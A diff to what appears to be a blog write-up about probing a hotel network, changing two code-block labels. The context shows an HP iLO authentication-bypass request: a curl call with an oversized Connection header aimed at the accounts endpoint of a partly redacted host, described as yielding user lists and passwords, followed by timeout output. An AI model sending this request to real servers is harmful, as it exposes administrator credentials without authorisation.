@@ -199,7 +199,7 @@ iLO is Integrated Lights Out, and is a piece of management hardware in most HP s
 
 Wow! So, all we need to do to get a list of users and passwords for iLO is make a request to the iLO server's API and send it a bunch of "A"s. Let's give it a go:
 
-```cmd
+```batch
 C:\>curl -i -k -H "Connection: AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" https://xxxxxxxx-akl-nz-lo.reivernet.com/rest/v1/AccountService/Accounts
 
 curl: (7) Failed to connect to xxxxxxxx-akl-nz-lo.reivernet.com port 443: Timed out
@@ -207,7 +207,7 @@ curl: (7) Failed to connect to xxxxxxxx-akl-nz-lo.reivernet.com port 443: Timed 
 
 Damn, nothing. Just to make sure, let's test a normal request to iLO that should be actively rejected by the server:
 
-```cmd
+```batch
 C:\>curl -i -k https://xxxxxxxx-akl-nz-lo.reivernet.com/rest/v1/AccountService/Accounts
 
 curl: (7) Failed to connect to xxxxxxxx-akl-nz-lo.reivernet.com port 443: Timed out
